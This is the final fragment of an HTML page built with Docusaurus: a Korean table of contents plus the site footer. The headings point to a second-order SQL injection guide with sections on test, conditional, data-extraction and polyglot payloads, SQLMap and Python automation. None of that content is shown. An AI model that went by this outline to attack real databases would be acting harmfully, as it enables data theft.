href="#트러블슈팅-체크리스트" class="table-of-contents__link toc-highlight">트러블슈팅 체크리스트</a><ul><li><a href="#페이로드가-실행되지-않을-때" class="table-of-contents__link toc-highlight">페이로드가 실행되지 않을 때</a></li><li><a href="#저장은-되지만-실행-안-될-때" class="table-of-contents__link toc-highlight">저장은 되지만 실행 안 될 때</a></li><li><a href="#탐지-방법" class="table-of-contents__link toc-highlight">탐지 방법</a></li></ul></li><li><a href="#빠른-명령어-참조-quick-reference" class="table-of-contents__link toc-highlight">빠른 명령어 참조 (Quick Reference)</a><ul><li><a href="#테스트-페이로드-회원가입프로필" class="table-of-contents__link toc-highlight">테스트 페이로드 (회원가입/프로필)</a></li><li><a href="#조건부-페이로드" class="table-of-contents__link toc-highlight">조건부 페이로드</a></li><li><a href="#데이터-추출-페이로드" class="table-of-contents__link toc-highlight">데이터 추출 페이로드</a></li><li><a href="#polyglot-페이로드" class="table-of-contents__link toc-highlight">Polyglot 페이로드</a></li><li><a href="#sqlmap-second-order" class="table-of-contents__link toc-highlight">SQLMap Second-Order</a></li><li><a href="#python-자동화" class="table-of-contents__link toc-highlight">Python 자동화</a></li></ul></li><li><a href="#참고-자료" class="table-of-contents__link toc-highlight">참고 자료</a></li><li><a href="#다음-단계" class="table-of-contents__link toc-highlight">다음 단계</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/my-docusaurus-page/">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2026 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>